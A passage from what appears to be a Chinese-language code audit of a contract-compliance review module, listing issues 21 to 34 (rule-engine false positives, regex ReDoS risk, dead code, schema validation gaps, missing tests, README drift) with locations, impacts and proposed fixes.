- **位置**：`playbookengine.py:42-52`（`_keyword_hit`：`any(kw in text)`）、`55-67`（`_semantic_hit`：签名带 `threshold` 但**函数体完全没用它**）、`70-79`（`_llm_confirm`：无论有无 llm 一律 `return True`，注释写"预留"）、`82-89`（`_rule_confidence`：`matched_by=="llm"` 给 **1.0**）；默认规则仅 9 条（`playbook/default_rules/labor_contract.json`），如"试用期上限违规"的 `match_pattern` 是 `试用期,试用期限,试用期为,试用期不得`
- **影响**：① 规则名叫"试用期**上限违规**"，但实现是"只要出现'试用期'三个字就命中" → 一份完全合法的"试用期为一个月"合同会被判 high 风险，**假阳性泛滥**；② 反过来，"未约定试用期工资"这类**缺失型风险**（completeness 维度）永远无法命中，因为引擎只做正向包含、没有"必须出现/不得出现/数值区间"的判定能力；③ `match_type="semantic"` 实际退化为关键词 + `description` 分词包含（63-66 行），`match_threshold` 与 `settings.compliance_playbook_semantic_threshold`（`config.py:149`，零引用）双双失效 → 用户在 Playbook 页面调阈值毫无效果；④ `hybrid` 规则的 LLM 确认层恒真却给出 `confidence=1.0`，虚高置信度直接污染 `reflect` 的 `avg_conf`（`runtime.py:191`）与报告展示的"置信度"；⑤ 关键词匹配未做大小写/全半角归一（`classify_doc_type` 却做了 `.lower()`，`parser.py:53`，前后不一致），也无词边界与否定处理（"不含违约金"会命中"违约金"）；⑥ `hits.sort` 的注释说"同权重按规则 priority 升序"，代码实际按 `clause_number` 排（158 行），`priority` 字段在排序中完全没用上。
- **修复**：把规则模型升级为可判定的 DSL：`{scope: clause_type/regex, condition: must_contain | must_not_contain | number_in_range | date_before | ratio_gt, params: {...}}`，并至少实现"缺失型"（must_contain 未满足 → completeness 风险）与"数值型"（试用期月数 vs 合同期限档位、违约金比例 vs 法定上限）两类判定；`_semantic_hit` 真正实现为"条款向量 vs 规则描述向量"的余弦相似度并与 `threshold` 比较（向量能力已在 `knowledgevector_store.py` 具备）；`_llm_confirm` 未实现前不得返回 `matched_by="llm"`/`confidence=1.0`，应返回 `semantic` 或显式 `unimplemented` 并降置信；文本匹配前统一 `normalize`（小写 + 全半角 + 去空白）；排序键改为 `(level_order, priority, clause_number)` 与注释一致。

### 问题 22（一般・安全/健壮性）：用户可写入任意正则且无编译校验、无执行超时 → ReDoS 与规则静默失效

- **位置**：`playbookengine.py:46-51`（`re.search(pattern[3:], text)`，`re:` 前缀）、`schemasplaybook.py:22`（`match_pattern: Optional[str]`，无校验）、`apiplaybooks.py:95-120`（创建时不试编译）
- **影响**：① `match_pattern` 由 admin 自由填写，`(a+)+$` 这类灾难性回溯模式作用在数千字条款文本上会**长时间 100% CPU**，且发生在 BackgroundTasks 线程里 → 单条规则即可拖垮审查流水线（线程池耗尽，见问题 15）；② 正则非法时只在匹配瞬间 `logger.warning` 后 `return False`（49-51 行）→ 规则**永久静默不命中**，运营人员无从得知自己配错了；③ 每次匹配都重新 `re.search` 未缓存编译结果，O(clauses × rules) 下重复编译开销明显。
- **修复**：写入端（`create_playbook`/`update_playbook`）对 `re:` 前缀的 pattern 做 `re.compile` 试编译，失败返回 422 并给出错误位置；用 `lru_cache` 缓存编译结果；执行侧加保护——限制 pattern 长度、拒绝嵌套量词的启发式检查，或用 `regex` 库的 `timeout=` 参数；匹配失败/异常时在 Playbook 列表接口回显 `last_error`。

### 问题 23（一般・正确性）：`compare_template` 用 `match_pattern` 与 `clause_number` 做互相包含匹配，语义完全错位

- **位置**：`runtime.py:219-272`，核心是 225-238 行：`rp = (rule.get("match_pattern") or "").lower()`，判定条件是 `rp in cn.lower() or cn.lower() in rp`（`cn` 是**条款号**，如"第三条"），并用 `float(rule.get("priority") or 100)` 当"匹配得分"取最大值
- **影响**：① 拿"关键词/正则"去和"条款号"比包含关系，正常情况下几乎不可能命中（除非 pattern 恰好是"第三条"这类字符串）→ `template_deviation` 恒为 0、`template_standard`/`suggested_clause` 补全与 `red_line` 升级（254-256 行）**基本不会触发**，整个模板比对功能名存实亡；② `priority`（业务优先级整数，默认 100）被当成相似度分数比较，`best_score > 0` 的判断也让 `priority=0` 的规则永远选不上；③ `template_id` 根本没传进来（问题 10），也没有任何"模板文档"的加载与逐条对齐逻辑——所谓"模板偏离检测"缺少被比对的另一方；④ 251 行的 `elif sugg and enriched.get("suggestion") and sugg not in ...` 会把企业标准措辞追加进 AI 建议，但没有标注来源，报告中无法区分"AI 建议"与"企业模板要求"。
- **修复**：先定义模板实体（`ComplianceTemplate`：条款骨架 + 标准措辞 + 必备条款清单 + 顺序），比对逻辑改为"合同条款集合 vs 模板条款集合"的对齐（按 `clause_type` 分组 + 文本相似度），输出三类偏离：`missing_clause`（模板有合同无）、`extra_clause`、`wording_deviation`（相似度 < 阈值），并把结果写入 `ReviewState.template_diff`（该字段已声明却从未使用）与报告；匹配得分用真实相似度而非 `priority`。

### 问题 24（一般・正确性）：关键信息抽取是"关键词位置 + 截 120 字符"，不是抽取；条款类型规则里混入了正则字面量

- **位置**：`agentsextractor.py:58-72`（`_extract_key_info_rule_based`：`idx = haystack.find(kw)` → `info[field] = haystack[idx:idx+120]`）、`46-55`（`_KEYINFO_RULES`，其中 `term` 的关键词是 `"自"`、`"起至"` 这类单字/碎片）、`19-33`（`_CLAUSE_TYPE_RULES` 的 `ClauseType.TERM` 列表里含 `"自.*起至"`）、`36-43`（`_classify_clause_type` 用 `kw in haystack` 做字面包含）
- **影响**：① `key_info["party_a"]` 的值是"从'甲方'二字开始的 120 个字符"的原文片段，不是甲方名称 → Word 报告的"合同基本信息"表（`word_exporter.py:96-118`）和 HTML 的 `ki_rows`（`generator.py:75`）里全是噪声文本；② `"自"` 作为关键词几乎在任意中文合同里都会命中（"自行""自然""自签订之日起"），`term` 字段基本等于随机片段；③ `"自.*起至"` 被当**字面字符串**做 `in` 判断，永远不可能命中——这是一处明确的编码错误（作者本意是正则）；④ `extract()` 直接原地修改传入的 clause 字典（94-96 行 `c["clause_type"] = ...`），在 LangGraph 中就地改 state 会破坏 checkpoint 的可重放性与时间旅行语义；⑤ 非 test 模式下条款分类仍走规则（只有 `key_info` 走 LLM，99-103 行），与 `agentsextractor.py:8-9` 文档声称的"openai/ollama：结构化 LLM（KeyInfo/**Clause** 输出）"不符。
- **修复**：① 关键词规则改为"锚点 + 结构化捕获"（如 `甲方[:：]?\s*([^\n，,。]{2,50})`）并对每个字段做后处理清洗与置信度标注；② 删掉 `"自.*起至"`，需要正则就用 `re.search`；③ LLM 模式下用 `Clause` schema 做条款分类（schema 已定义于 `schemasreview.py:48-53`，从未使用）；④ `extract()` 返回新字典而非原地改（`{**c, "clause_type": ...}`）；⑤ `key_info` 抽取结果落 `ComplianceKeyInfo` 表（模型已存在，零写入）。

### 问题 25（一般・正确性）：页码映射键空间错误 → `page_number` 恒为 None；`parser.py` 主要函数全部未被调用

- **位置**：`parsingparser.py:110-124`（`collect_page_map` 以"累计行号 offset"为键构造 `{offset: page}`）、`88-96`（`build_parsing_result` 却用**条款下标 `i`** 去 `page_map.get(i)`）、`skillsparse_skill.py:39-40`（`c["page_number"] = c.get("page_number")` —— 自赋值空操作）
- **影响**：① 行号空间与条款下标空间完全不同，`page_map.get(i)` 几乎必然 miss → 报告无法给出"风险在第几页"，法务定位成本大增；② `parse_skill.py:40` 是一行明显的无效代码（把值赋给自己），暴露该处逻辑未实现；③ `build_parsing_result` / `parse_document` / `collect_page_map` / `dump_result` 在 `ParseSkill` 走的是 `load_text` + `split_clauses_from_text` 的旁路（`parse_skill.py:35-37`），**全部无调用方**（145 行死代码），且 `parser.py:139` 自己承认 `parse_document` 会重复读文件两遍；④ 条款切分只看"第X条"正则（`clause_splitter.py:19-21`），对"1. / 一、/ (一) / Article 3"等常见编号体系一律不识别，无标记时整篇当"第一条"（54-55 行）→ 大文档退化成单条款，后续逐条审查与覆盖率统计全部失真；⑤ `_refine_with_llm`（82-96 行）只打日志、无调用方。
- **修复**：把页码信息在**切分之前**就绑定到文本片段（用 `load_document` 返回的 per-page `Document` 逐页切条款，天然带 `metadata["page"]`），而不是事后按行号反查；删除 `parse_skill.py:40` 的空操作；`ParseSkill` 统一走 `parser.parse_document`（并修掉重复读文件），或删除 `parser.py` 中未被使用的函数；条款切分增加多编号体系正则与"无标记时按段落/长度兜底切分"，并在 `doc_confidence` 之外输出 `split_confidence` 供 reflect 使用。

### 问题 26（一般・架构/合规）：规则与审查结论无版本快照，无法复现历史审查

- **位置**：`apiplaybooks.py:123-158`（`update_playbook` 直接改行 + `version += 1`，`delete_playbook` 硬删，无历史表）；`modelsreview.py:69`（`ComplianceRisk.playbook_rule_id` 是裸 `String(36)`，无 FK，且因问题 1 从未写入）；`review_service.py:280-286`（`delete_review`）
- **影响**：① 规则被修改/删除后，**无法回答"半年前这份合同为什么被判高风险"**——合规审计与诉讼举证的基本要求；② `version` 字段自增但没有版本表，等于没有版本；③ `delete_playbook` 硬删会让历史审查的规则引用彻底悬空；④ `delete_review` 只 `db.delete(review)`，模型层没有定义任何 `relationship(cascade=...)`，而 SQLite 默认不开 `PRAGMA foreign_keys`（全库检索 `foreign_keys`/`PRAGMA` 命中 0）→ `ondelete="CASCADE"` 在 SQLite 下不生效，留下孤儿 risks/refs/reports/human_actions；磁盘上的报告文件也不清理（`data/compliance/reports/` 只增不减）。
- **修复**：① 新增 `compliance_playbook_versions`（或 `compliance_review_rule_snapshots`）：审查启动时把当次生效的规则集快照（JSON）随 review 落库，报告与风险项引用快照 id；② Playbook 改软删（`is_active=False` + `deleted_at`），禁止硬删；③ `delete_review` 显式级联删除子表行 + 磁盘报告文件，或在 SQLAlchemy 模型上补 `relationship(..., cascade="all, delete-orphan")`；④ 若继续支持 SQLite，在 `appdatabase.py` 的 engine 上加 `PRAGMA foreign_keys=ON` 事件监听。

### 问题 27（一般・架构）：Service 层被 API 绕过 + 753 行死代码（占模块 12.8%）

- **位置与事实**（逐项已用全库引用检索确认）：
  - `servicesregulation_service.py`（269 行）：`RegulationService` **零调用**，`apiknowledge.py` 自己内联实现了摄入/删除/检索；
  - `servicesplaybook_service.py`（145 行）：`PlaybookService` **零调用**，`apiplaybooks.py` 自己内联实现 CRUD；
  - `knowledgeseed_data.py`（88 行）：`load_seed_regulations` **零调用**（`/seed` 端点重写了一份不含向量化的版本）；
  - `harnessstream.py`（45 行）：`format_event`/`phase_data`/`risk_data`/`done_data`/`error_data` **零调用**，模块 docstring 声称"SSE 端点每 500ms 查 status"，但 `apireviews.py` 里**没有任何 SSE 端点**（前端 `viewscompliance.py` 靠轮询 `GET /reviews/{id}`）；
  - `workflowsnodes.py`（47 行）：`stream_updates`/`invoke`/`run_to_end` **零调用**，docstring 称"供单测 test_review_graph 使用"，而该测试不存在；
  - `agentsresearcher.py`（86 行）：`ResearcherAgent` 仅在 `agents__init__.py` 被 re-export；
  - `skillsrag_skill.py`（73 行）：仅在 `runtime.py:73` 被实例化，从未 `execute`；
  - `parsingparser.py`（145 行）中 `build_parsing_result`/`parse_document`/`collect_page_map`/`dump_result` 无调用方。
- **影响**：① README/项目结构宣称的"api → services → harness"分层在合规模块**没有真正生效**，业务逻辑（含事务边界、幂等、向量化）散落在路由函数里，导致问题 16/18 这类"两条实现分叉"的 bug；② 大量"看起来已实现"的能力（SSE 进度、法规检索、引用校验、图执行辅助）实际不可达，会持续误导后续维护者与评审者——本次 README 与实现的多处漂移正源于此；③ 死代码占据 12.8% 的模块体量，掩盖了真实完成度。
- **修复**：二选一并立刻执行——**接线**（把 RagSkill/Researcher 接入图、把 `/seed` 改为调 `load_seed_regulations`、把 `apiknowledge.py` 与 `apiplaybooks.py` 的业务逻辑搬回 Service、要么实现 SSE 端点要么删掉 `stream.py`）或**删除**（`nodes.py`、`stream.py`、未接线的 Service）。建议同时加一条 CI 检查（`vulture` 或自定义 AST 扫描）拦截"导出但零调用"的公开函数。

### 问题 28（一般・正确性）：`list_reviews` 的 `total` 与 `items` 过滤口径不一致，superuser 分页错乱

- **位置**：`apireviews.py:65-71`：`total` 用的是"superuser 不过滤、普通用户按 `created_by` 过滤"的查询（66-68 行），而 `items` 无条件调用 `service.list_reviews(db=db, user_id=current_user.id, ...)`（70 行），后者内部恒定 `filter(created_by == user_id)`（`review_service.py:187-188`）
- **影响**：superuser 看到 `total = 全库审查数`，但 `items` 只有自己的记录 → 前端分页页数虚高、翻页空白；同时 superuser **无法**按设计查看全量审查列表（与 `list_regulations`/`list_playbooks` 的管理视角不一致）。
- **修复**：把过滤逻辑收敛到 Service 一处，`list_reviews(db, user_id=None if is_superuser else current_user.id, ...)`，`total` 与 `items` 复用同一个 query 对象（`q.count()` + `q.limit().offset()`）。

### 问题 29（一般・健壮性）：`_persist_status` 每节点开一个短连接、静默吞异常、`setattr` 无字段白名单

- **位置**：`runtime.py:79-99`（`SessionLocal()` per call，一次审查 8+ 次；`except Exception: logger.warning` 后继续）、`91-93`（`for k,v in extra.items(): if hasattr(row,k): setattr(row,k,v)`）；调用点 `runtime.py:122/144/152/161/173/178/200/265/281/294/320/333`
- **影响**：① 每个节点两次落库（如 `review_clauses` 在 161 与 173 行各写一次），SQLite 下并发写极易 `database is locked`，而异常被降级为 warning → **进度/计数静默丢失**，前端进度条卡住但流水线继续；② `hasattr` + `setattr` 的宽松写法会把拼错的键（如 `retry_counts`）无声忽略，问题 11 那类 schema 漂移更难被发现；③ 状态写入与业务写入不在同一事务，`status=completed` 可能与风险数据不一致。
- **修复**：① 一次审查复用一个 Session（在 `start_review` 里开、`finally` 关），或改用异步/批量进度上报；② 把可写字段收敛成显式白名单常量，未知键 `logger.error` 并抛出（开发期）；③ 终态写入（`completed`/`failed`）与结果落库放在**同一事务**；④ SQLite 场景开启 WAL 并设置 `busy_timeout`。

### 问题 30（一般・安全/校验）：Schema 校验缺失——枚举未用、列表无上限、更新接口盲目 `setattr`

- **位置**：`schemasreview.py:145-152`（`action: str`、`new_risk_level: Optional[str]`、`risk_ids: list[str]` 无 `max_length`、`note`/`new_suggestion` 无长度限制）；`schemasplaybook.py:18-29`（`contract_type`/`risk_level`/`match_type` 均为裸 `str`，`match_threshold`/`priority` 无 `geplaybooks.py:134-136`（`patch = req.model_dump(exclude_unset=True)` → `for k,v: setattr(p,k,v)`）
- **影响**：① `risk_level` 写成 `"urgent"` 这类非法值时，`runtime.py:169-171` 的三级计数与 `reporter.py:19-25` 的 `_count_risks` 都用精确匹配 → 该风险**既不计入任何等级、也不在报告总览出现**，但仍在明细里，静默漏计；② `new_risk_level` 超 10 字符时 `ComplianceRisk.risk_level = String(10)` 在 PG 下抛 `StringDataRightTruncation` → 500；③ `risk_ids` 无上限 + `human_action` 里逐个 `db.query`（`review_service.py:305-306`，N+1）→ 一个请求塞 10 万个 id 即可打满 DB 连接与线程；④ 盲目 `setattr` 是典型 mass-assignment 面：一旦将来给 `PlaybookUpdateRequest` 加上 `id`/`created_by`/`version` 字段，客户端即可改写主键与归属；⑤ `match_threshold` 可传 `5.0`、`priority` 可传 `-1`，引擎不会报错但行为无定义。
- **修复**：所有枚举字段改用已定义的 `RiskLevel`/`ClauseType`/`DocType` 或 `Literal[...]`；`risk_ids: list[str] = Field(max_length=200)`；文本字段加 `max_length`；数值加 `ge/le`；`update_playbook` 改为显式字段映射或 `PLAYBOOK_UPDATABLE_FIELDS` 白名单；所有请求模型 `extra="forbid"`。

### 问题 31（一般・工程质量）：合规模块零自动化测试，`tests/` 只有 4 个空 `__init__.py`

- **位置**：`tests__init__.py`（均为 0 字节）；`test_e2e.py` 覆盖注册/登录/上传/RAG 查询/健康检查，**不含任何 compliance 场景**；README「测试」章节的"合规审查链路"是 4 条手工 curl
- **影响**：5,897 行、含 LLM 与法律结论的核心模块没有任何回归网；本次发现的问题 1/7/9/10/11/16/19 全部属于"一条最小集成测试就能拦住"的类型（断言 `GET /reviews/{id}` 的 `risks` 非空、断言 Word 报告文件名匹配下载 glob、断言 `template_id` 出现在 state）。`workflowsnodes.py` 的 docstring 还专门提到"供单测 test_review_graph 使用"，测试却不存在。README 的未来规划也把"更多测试覆盖"列为未完成项。
- **修复**：按优先级补：① 图级契约测试（`LLM_PROVIDER=test` 下跑通 parse→…→completed，断言 state 关键字段与 DB 落库结果）；② 报告三路一致性测试（同一 `report_data` 下 HTML/Word/PDF 的风险计数必须相等、文件名必须能被下载接口找到）；③ 权限测试（跨用户访问 review/document 必须 403，`review_id="*"` 必须 400）；④ Playbook 引擎单测（命中/未命中/缺失型/正则非法/ReDoS 超时）；⑤ citation_verifier 单测（逐字引用必须 verified=True、篡改一字必须 False）。CI 上加 `pytest --cov=app/compliance`，先设阈值再逐步提高。

### 问题 32（一般・文档漂移）：README / 注释与实现大量不一致，会直接误导使用者与后续维护者

- **位置与逐条对照**：
  1. README「合规审查 → Playbook 规则库」示例 payload 用 `rule_id`/`rule_type`/`keywords`，实际 `PlaybookCreateRequest`（`schemasplaybook.py:13-29`）要求 `name` 且字段名是 `match_type`/`match_pattern` → 按文档调用直接 **422**；示例里的 `"rule_type": "threshold"` 在引擎中**没有任何实现**（`playbookengine.py` 只认 keyword/semantic/hybrid）；
  2. README「法规知识库」示例用 `name`/`clauses`/`article`，实际 `RegulationIngestRequest`（`schemasregulation.py:9-23`）要 `title`/`articles`/`article_number` → **422**；
  3. README 的 HITL 示例是 `POST /reviews/{id}/human` + `{"risk_id": ...}`，实际路由是 `POST reviews.py:104`）+ `{"risk_ids": [...]}` → **404**；
  4. README 的 `POST /reviews` 示例带 `playbook_id`，schema 无此字段（见问题 19）→ 静默忽略；
  5. README 称 `/knowledge/seed` 会初始化"Playbook 默认规则 + 4 部核心法规"，实际只写法规、不写规则（见问题 12）；
  6. README 的 LangGraph 图含 `RagSkill`、`ResearcherAgent`、`HitlManager` 节点，实际图中不存在（见问题 8/13）；状态机图含 `parsing --> failed`，实际无条件边（见问题 7）；
  7. README 称报告下载"HTML/Word/PDF 三路"，实际 Word 因文件名契约不一致恒 404（见问题 9）；
  8. `apiknowledge.py:190` docstring 称 `/search` 是"混合检索——语义向量 + 关键词 RRF 融合"，实现是纯向量（`retrieval.py:54-58`）；
  9. `harnessstream.py` docstring 描述的 SSE 端点不存在（见问题 27）；`runtime.py:275-279` 声称 human_review 会调 `record_human_action` 留痕，实际没有（见问题 13）；`review_service.py:4` 声称"幂等：同一 document_id + 合同类型不重复建"，实际每次调用都新建 review（88-100 行）；
  10. README 部署验证写 `curl /api/health → {"status":"ok","version":"0.4.0"}`，实际 `appmain.py:127` 返回 `"0.1.0"`（`FastAPI(version="0.1.0")`，`main.py:93`）；
  11. `config.py:135` 的 `compliance_enabled` 注释说"false 时不加载审查路由/模型"，实际只在 `app__init__.py:16` 门控了模型导入，`approuter.py:20-22` **无条件挂载三个合规路由** → 关掉开关后路由仍在但表未建，请求直接 500；
  12. `config.py` 中 `compliance_playbook_semantic_threshold`(149)、`compliance_hitl_auto_confirm_low`(155)、`compliance_default_contract_type`(160)、`compliance_regulation_dir`(158) 四个配置项**零引用**，而代码里硬编码了 `"labor_contract"`（`review_service.py:103`）与 `rule.get("match_threshold", 0.8)`（`engine.py:100`）。
- **修复**：以代码为准重写 README 的合规章节（建议用 `/docs` 导出的 OpenAPI 片段替换手写 curl）；无法短期实现的能力（RagSkill 接线、真 HITL、模板比对、SSE）在 README 明确标注"MVP 未接线/规划中"，不要画进"已实现"的流程图；`compliance_enabled` 要么真正门控路由（`if settings.compliance_enabled: api_router.include_router(...)`），要么删掉该开关；未使用的配置项删除或接入代码。

### 问题 33（一般・性能/成本）：无 LLM 护栏（超时/重试/并发/预算），且存在重复计算

- **位置**：`agentsreviewer.py:113-125`（逐条款 `structured.invoke(prompt)`，串行、无 timeout、无 retry、无并发；异常 `return []`）、`runtime.py:159-174`（`_playbook_skill.execute` 的结果赋给 `pb` 后**从未使用**，而 `RiskSkill → ReviewerAgent.review_all → match_rules_for_clauses` 会把同一批条款×规则**再算一遍**）、`apireviews.py` 全端点无请求体大小限制、`viewscompliance.py:64-80`（渲染时无条件把三种格式报告全部下载一遍）
- **影响**：① 50 条款合同在 LLM 模式下 = 50 次串行调用，无超时与退避，任一慢响应即拖住整个 BackgroundTasks 线程（叠加问题 15 的线程池耗尽）；② `with_structured_output(RiskItem)` 的 schema 是**单个** `RiskItem`，一条条款最多只能产出 1 条风险（`reviewer.py:120-122` 的 `isinstance` 兼容分支说明作者已察觉），多问题条款会丢风险；③ Playbook 匹配算两遍，LLM 模式下等于成本翻倍；④ 异常一律 `return []` → LLM 故障与"真的没风险"不可区分（回到问题 12 的假阴性）；⑤ 无 token/成本统计，无法做预算告警；⑥ 前端每次 rerun 触发 3 次报告下载请求，Streamlit 交互频繁时放大后端压力。
- **修复**：① 逐条审查改为批量（一次 prompt 审 N 条）或 `asyncio.gather` + 信号量限流，schema 改为 `RiskItemList(risks: list[RiskItem])`；② 统一 LLM 调用封装：timeout、指数退避重试（区分 429/5xx/解析失败）、失败时返回 `error` 而非空列表并计入 `review.degraded_nodes`；③ 删除 `review_clauses` 里无用的 `_playbook_skill.execute`，或改为把 `pb["hits"]` 作为线索传给 `RiskSkill`（`ctx["playbook_hits"]`），避免重复匹配；④ 前端下载改为点击时惰性请求；⑤ 接入 token 用量统计与每审查成本上限。

### 问题 34（提示・仓库卫生）：运行产物与测试数据被提交进仓库

- **位置**：`data__init__.py`
- **影响**：① 生成的审查报告可能含真实合同的甲乙方/金额/风险结论，入库即泄露（该 HTML 标题里的 `doc-b44ee52a-...` 说明来自一次真实运行）；② `data/` 既是运行时落盘目录（`compliance_report_dir` 默认值）又进了版本控制，部署后会产生持续的 dirty working tree 与合并冲突；③ 报告目录无清理策略，长期运行会撑满磁盘（README 只给了 `ln -s` 到大容量存储的建议）。
- **修复**：`.gitignore` 加 `data/compliance/reports/`、`data/compliance_test/`，用 `git rm --cached` 清除已提交产物并检查历史（若含真实数据需评估是否要 rewrite history）；测试用固定 fixture 放 `tests/fixtures/`；报告目录加保留期清理任务（如 90 天）与容量监控。
